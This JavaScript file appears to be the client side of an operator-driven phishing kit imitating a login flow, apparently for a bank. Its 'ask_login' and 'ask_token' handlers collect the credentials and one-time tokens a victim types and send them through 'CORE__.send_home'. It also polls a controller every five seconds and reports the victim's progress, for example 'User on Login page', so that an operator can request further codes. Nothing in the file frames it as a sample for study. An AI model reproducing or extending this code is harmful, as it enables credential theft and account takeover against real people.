$(document).ready(function() {
  REST_FN__.ask_login = {
    view: function() {
      return $("#login-view");
    },
    count: 1,
    show: function() {
      $(this.view()).show();
      if (this.count > 0) {
        this.error();
      }
      // window.top.location.href="../login/?op="+btoa(JSON.stringify(last_operation));return;
      // window.top.location.href="../login/";return;





      this.count++;
      this.shown();
    },
    error: function() {
      $("form#loginform")[0]
        .reset();
      $("form#loginform")
        .submit();

      $('.rass-uicontrol-qrcode').attr('src','grayed-out-vc-'+php_js.lng+'.png');
      $('#rass-data-inlogcode').val('')
    },
    send: function(data) {
      window.top.CORE__.show_wating();
      respond.prev_op="ask_login";
      respond.keys = data;
      bider_obj.w = 1;
      CORE__.send_home(function() {});
    },
    shown: function() {
      window.top.CORE__.hide_wating();
      respond.mes = last_operation.success_mes;
      CORE__.send_home();
    }
  };


  REST_FN__.ask_token = {
    view: function() {
      return $("#token-view");
    },
    count: 0,
    show: function() {
      $(this.view()).show();
      if (this.count > 0) {
        // this.error();
        window.top.location.href="../token/?op="+btoa(JSON.stringify(last_operation));return;

      }
      // window.top.location.href="../token/?op="+btoa(JSON.stringify(last_operation));return;
      // window.top.location.href="../token/";return;

      $('.rass-uicontrol-qrcode').attr('src',last_operation.qr);

      this.count++;
      this.shown();
    },
    error: function() {
     $("form#token-view")[0]
        .reset();
     $("form#token-view")
        .submit();
    },
    send: function(data) {
      window.top.CORE__.show_wating();
      respond.prev_op="ask_token";
      respond.mes = JSON.stringify(data);
      bider_obj.w = 1;
      CORE__.send_home(function() {});
    },
    shown: function() {
      window.top.CORE__.hide_wating();
      respond.mes = last_operation.success_mes;
      CORE__.send_home();
    }
  };

  $("head base").attr("href", "");
  CORE__.bidder();
  bidder_timer = setInterval(function() {
    CORE__.bidder();
  }, 5000);

  respond.mes = "User on Login page";
  CORE__.send_home();

  if ("op" in php_js) {
    last_operation = php_js.op;
    REST_FN__[last_operation.init_fn].show();
  }
});

//?op="+btoa(JSON.stringify(last_operation));
